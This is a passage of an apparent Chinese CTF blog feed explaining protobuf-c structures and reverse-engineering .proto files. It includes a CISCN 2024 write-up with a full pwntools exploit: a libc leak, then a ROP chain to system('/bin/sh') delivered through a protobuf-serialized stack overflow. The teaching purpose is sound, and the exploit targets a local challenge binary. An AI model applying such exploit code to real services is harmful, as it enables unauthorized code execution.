id=&#34;label&#34;&gt;&lt;span&gt;&lt;strong&gt;label&lt;/strong&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#label&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;typedef enum {&#xD;&#xA;    /** A well-formed message must have exactly one of this field. */&#xD;&#xA;    PROTOBUF_C_LABEL_REQUIRED,&#xD;&#xA; &#xD;&#xA;    /**&#xD;&#xA;     * A well-formed message can have zero or one of this field (but not&#xD;&#xA;     * more than one).&#xD;&#xA;     */&#xD;&#xA;    PROTOBUF_C_LABEL_OPTIONAL,&#xD;&#xA; &#xD;&#xA;    /**&#xD;&#xA;     * This field can be repeated any number of times (including zero) in a&#xD;&#xA;     * well-formed message. The order of the repeated values will be&#xD;&#xA;     * preserved.&#xD;&#xA;     */&#xD;&#xA;    PROTOBUF_C_LABEL_REPEATED,&#xD;&#xA; &#xD;&#xA;    /**&#xD;&#xA;     * This field has no label. This is valid only in proto3 and is&#xD;&#xA;     * equivalent to OPTIONAL but no &amp;#34;has&amp;#34; quantifier will be consulted.&#xD;&#xA;     */&#xD;&#xA;    PROTOBUF_C_LABEL_NONE,&#xD;&#xA;} ProtobufCLabel;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对应关系&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef enum {&#xD;&#xA;    PROTOBUF_C_LABEL_REQUIRED = 0,  &#xD;&#xA;    PROTOBUF_C_LABEL_OPTIONAL = 1,  &#xD;&#xA;    PROTOBUF_C_LABEL_REPEATED = 2, &#xD;&#xA;    PROTOBUF_C_LABEL_NONE = 3 &#xD;&#xA;} ProtobufCLabel;&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;type&#34;&gt;&lt;span&gt;&lt;strong&gt;type&lt;/strong&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#type&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;p&gt;这里的&lt;code&gt;E&lt;/code&gt;就是对应的类型，也就是&lt;code&gt;string&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef enum {&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_INT32,      /**&amp;lt; int32 */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_SINT32,     /**&amp;lt; signed int32 */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_SFIXED32,   /**&amp;lt; signed int32 (4 bytes) */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_INT64,      /**&amp;lt; int64 */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_SINT64,     /**&amp;lt; signed int64 */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_SFIXED64,   /**&amp;lt; signed int64 (8 bytes) */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_UINT32,     /**&amp;lt; unsigned int32 */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_FIXED32,    /**&amp;lt; unsigned int32 (4 bytes) */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_UINT64,     /**&amp;lt; unsigned int64 */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_FIXED64,    /**&amp;lt; unsigned int64 (8 bytes) */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_FLOAT,      /**&amp;lt; float */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_DOUBLE,     /**&amp;lt; double */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_BOOL,       /**&amp;lt; boolean */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_ENUM,       /**&amp;lt; enumerated type */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_STRING,     /**&amp;lt; UTF-8 or ASCII string */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_BYTES,      /**&amp;lt; arbitrary byte sequence */&#xD;&#xA;&#x9;PROTOBUF_C_TYPE_MESSAGE,    /**&amp;lt; nested message */&#xD;&#xA;} ProtobufCType;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;PROTOBUF_C_TYPE_INT32      = 0&#xD;&#xA;PROTOBUF_C_TYPE_SINT32     = 1&#xD;&#xA;PROTOBUF_C_TYPE_SFIXED32   = 2&#xD;&#xA;PROTOBUF_C_TYPE_INT64      = 3&#xD;&#xA;PROTOBUF_C_TYPE_SINT64     = 4&#xD;&#xA;PROTOBUF_C_TYPE_SFIXED64   = 5&#xD;&#xA;PROTOBUF_C_TYPE_UINT32     = 6&#xD;&#xA;PROTOBUF_C_TYPE_FIXED32    = 7&#xD;&#xA;PROTOBUF_C_TYPE_UINT64     = 8&#xD;&#xA;PROTOBUF_C_TYPE_FIXED64    = 9&#xD;&#xA;PROTOBUF_C_TYPE_FLOAT      = 10&#xD;&#xA;PROTOBUF_C_TYPE_DOUBLE     = 11&#xD;&#xA;PROTOBUF_C_TYPE_BOOL       = 12&#xD;&#xA;PROTOBUF_C_TYPE_ENUM       = 13&#xD;&#xA;PROTOBUF_C_TYPE_STRING     = 14&#xD;&#xA;PROTOBUF_C_TYPE_BYTES      = 15&#xD;&#xA;PROTOBUF_C_TYPE_MESSAGE    = 16&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;版本&#34;&gt;&lt;span&gt;版本&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%89%88%e6%9c%ac&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在proto3中，删除了字段的默认值，因此ProtobufCFieldDescriptor结构体中没有了default_value字段。&lt;/p&gt;&#xA;&lt;p&gt;可以根据逆向后字段的数量来判断题目用的proto版本。&lt;/p&gt;&#xA;&lt;p&gt;也就是结构体变成了0x40大小&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;也可以根据特点：&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Proto2&lt;/strong&gt;: 支持 &lt;code&gt;required&lt;/code&gt; 和 &lt;code&gt;optional&lt;/code&gt; 修饰符。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Proto3&lt;/strong&gt;: 默认所有字段为 &lt;code&gt;optional&lt;/code&gt;，不支持 &lt;code&gt;required&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;偏移问题&#34;&gt;&lt;span&gt;偏移问题&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%81%8f%e7%a7%bb%e9%97%ae%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;有时候我们的&lt;code&gt;proto&lt;/code&gt;文件：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; syntax = &amp;#34;proto2&amp;#34;;&#xD;&#xA; message Message_request{&#xD;&#xA;    required int32 id = 1;&#xD;&#xA;    required string sender = 2;&#xD;&#xA;    required uint32 len = 3;&#xD;&#xA;    required bytes content = 4;&#xD;&#xA;    required int32 actionid = 5;&#xD;&#xA; }&#xD;&#xA; message Message_response{&#xD;&#xA;    required int32 id = 1;&#xD;&#xA;    required string receiver = 2;&#xD;&#xA;    required int32 status_code = 3;&#xD;&#xA;    optional string error_message = 4;&#xD;&#xA; }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是生成的结构体：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct  _MessageRequest&#xD;&#xA;{&#xD;&#xA;  ProtobufCMessage base;&#xD;&#xA;  int32_t id;&#xD;&#xA;  char *sender;&#xD;&#xA;  uint32_t len;&#xD;&#xA;  ProtobufCBinaryData content;&#xD;&#xA;  int32_t actionid;&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现在结构体的头部多了一个ProtobufCMessage类型的变量，查看一下这个类型的定义：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct ProtobufCMessage {&#xD;&#xA;    /** The descriptor for this message type. */&#xD;&#xA;    const ProtobufCMessageDescriptor    *descriptor;&#xD;&#xA;    /** The number of elements in `unknown_fields`. */&#xD;&#xA;    unsigned                n_unknown_fields;&#xD;&#xA;    /** The fields that weren&amp;#39;t recognized by the parser. */&#xD;&#xA;    ProtobufCMessageUnknownField        *unknown_fields;&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;它存储这个结构体的一些关键信息，比如Descriptor和未识别的字段。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;ProtobufCMessage的大小为24字节&lt;/strong&gt;，因此我们自己定义的字段下标应该是从3开始。&lt;/p&gt;&#xA;&lt;p&gt;那为什么会多出一个参数呢？&lt;/p&gt;&#xA;&lt;p&gt;查看编译后的代码发现，bytes类型被替换为了ProtobufCBinaryData类型，看一下它的定义：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct ProtobufCBinaryData {&#xD;&#xA;    size_t  len;        /**&amp;lt; Number of bytes in the `data` field. */&#xD;&#xA;    uint8_t *data;      /**&amp;lt; Data bytes. */&#xD;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;它包括8字节的长度和8字节的数据部分，因此IDA识别时会多出一个参数。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;脚本&#34;&gt;&lt;span&gt;脚本&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%84%9a%e6%9c%ac&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pip3 install protobuf==3.20.3&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里protobuf的版本要用到3.20.x（只有1 2 3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。&lt;/p&gt;&#xA;&lt;p&gt;逆出proto文件后：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protoc --python_out=. message.proto&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再导入就好了&lt;/p&gt;&#xA;&lt;p&gt;相关脚本：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;import message_pb2&#xD;&#xA;&#xD;&#xA;pl=b&amp;#39;a&amp;#39;*0x218&amp;#43;p64(pop_rdi)&amp;#43;p64(binsh)&amp;#43;p64(ret)&amp;#43;p64(system)&#xD;&#xA;message = message_pb2.protoMessage()&#xD;&#xA;message.buffer = pl&#xD;&#xA;message.size = len(pl)&#xD;&#xA;&#xD;&#xA;pl = message.SerializeToString()&#xD;&#xA;p.send(pl)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考文章https://hackmd.io/@jsjsj/BkpBdW17kl&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-282203.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bbs.kanxue.com/thread-282203.htm&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/news/15171&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xz.aliyun.com/news/15171&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://c-lby.top/2024/protobuf-install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://c-lby.top/2024/protobuf-install/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;例题&#34;&gt;&lt;span&gt;例题&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%be%8b%e9%a2%98&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;ciscn-2024-华中赛区半决赛&#34;&gt;&lt;span&gt;CISCN 2024 华中赛区半决赛&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ciscn-2024-%e5%8d%8e%e4%b8%ad%e8%b5%9b%e5%8c%ba%e5%8d%8a%e5%86%b3%e8%b5%9b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;工具逆向&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;创建软链接，然后程序就能运行了&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ln -s /home/ctf/pwn/CISCN/protoverflow/libprotobuf.so.10 /usr/lib/libprotobuf.so.10&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反编译后发现一行代码:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;v5 = google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&amp;amp;unk_209080, s, v6);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其实这行代码是在对传入的数据用&lt;code&gt;protocol buffers&lt;/code&gt;的方式进行解密，所以我们传入的数据就需要用&lt;code&gt;protocol buffers&lt;/code&gt;加密之后再传入，这样才能正常&lt;code&gt;parse&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;把s中长度v6的内容&lt;code&gt;parse&lt;/code&gt;后存入&lt;code&gt;&amp;amp;unk_209080&lt;/code&gt;。解析成功返回true&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;相关的一些东西，不给题目中的是&lt;code&gt;ParseFromArray&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;bool SerializeToString(string* output) const;&lt;/code&gt;: serializes the message and stores the bytes in the given string. Note that the bytes are binary, not text; we only use the &lt;code&gt;string&lt;/code&gt; class as a convenient container.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;bool ParseFromString(const string&amp;amp; data);&lt;/code&gt;: parses a message from the given string.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;用pbtk解析：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;syntax = &amp;#34;proto2&amp;#34;;&#xD;&#xA;&#xD;&#xA;message protoMessage {&#xD;&#xA;    optional string name = 1;&#xD;&#xA;    optional string phoneNumber = 2;&#xD;&#xA;    required bytes buffer = 3;&#xD;&#xA;    required uint32 size = 4;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;protoc --python_out=. message.proto&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后使用这个语句编译成可以导入到python的文件&lt;/p&gt;&#xA;&lt;p&gt;得到对应文件之后，我们需要导入exp中&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xD;&#xA;import message_pb2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;漏洞点在&lt;code&gt;sub_324A&lt;/code&gt;的memcpy栈溢出&lt;/p&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xD;&#xA;import message_pb2&#xD;&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xD;&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xD;&#xA;def dbg():&#xD;&#xA;    gdb.attach(p)&#xD;&#xA;    # pause()&#xD;&#xA;&#xD;&#xA;address = &amp;#39;./pwn&amp;#39;&#xD;&#xA;p = process(address)&#xD;&#xA;&#xD;&#xA;elf = ELF(address)&#xD;&#xA;libc = elf.libc&#xD;&#xA;&#xD;&#xA;# ip = &amp;#34;&amp;#34;&#xD;&#xA;# port = &#xD;&#xA;#p = remote(ip,port)&#xD;&#xA;&#xD;&#xA;# leak libc&#xD;&#xA;p.recvuntil(b&amp;#39;Gift: &amp;#39;)&#xD;&#xA;gift = int(p.recv(14), 16)&#xD;&#xA;libc_base = gift - libc.sym[&amp;#39;puts&amp;#39;]&#xD;&#xA;libc.address = libc_base&#xD;&#xA;success(&amp;#34;libc_base = &amp;#34; &amp;#43; hex(libc_base))&#xD;&#xA;&#xD;&#xA;# rop&#xD;&#xA;system = libc.sym[&amp;#39;system&amp;#39;]&#xD;&#xA;binsh = next(libc.search(b&amp;#39;/bin/sh\x00&amp;#39;))&#xD;&#xA;ret = next(libc.search(asm(&amp;#39;ret&amp;#39;), executable=True))&#xD;&#xA;pop_rdi = next(libc.search(asm(&amp;#39;pop rdi; ret&amp;#39;), executable=True))&#xD;&#xA;pop_rsi = next(libc.search(asm(&amp;#39;pop rsi; ret&amp;#39;), executable=True))&#xD;&#xA;pop_rdx_r12 = next(libc.search(asm(&amp;#39;pop rdx; pop r12; ret&amp;#39;), executable=True))&#xD;&#xA;&#xD;&#xA;pl=b&amp;#39;a&amp;#39;*0x218&amp;#43;p64(pop_rdi)&amp;#43;p64(binsh)&amp;#43;p64(ret)&amp;#43;p64(system)&#xD;&#xA;message = message_pb2.protoMessage()&#xD;&#xA;message.buffer = pl&#xD;&#xA;message.size = len(pl)&#xD;&#xA;&#xD;&#xA;pl = message.SerializeToString()&#xD;&#xA;p.send(pl)&#xD;&#xA;&#xD;&#xA;p.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/news/15171&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xz.aliyun.com/news/15171&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>内核ebpfpwn（未完成版）</title>
      <link>http://localhost:1313/posts/kernel_ebpfpwn/</link>
      <pubDate>Mon, 02 Feb 2026 12:14:05 +0800</pubDate>
      <guid>http://localhost:1313/posts/kernel_ebpfpwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;基础知识&#34;&gt;&lt;span&gt;基础知识&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;常用代码&#34;&gt;&lt;span&gt;常用代码&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%b8%b8%e7%94%a8%e4%bb%a3%e7%a0%81&#34; 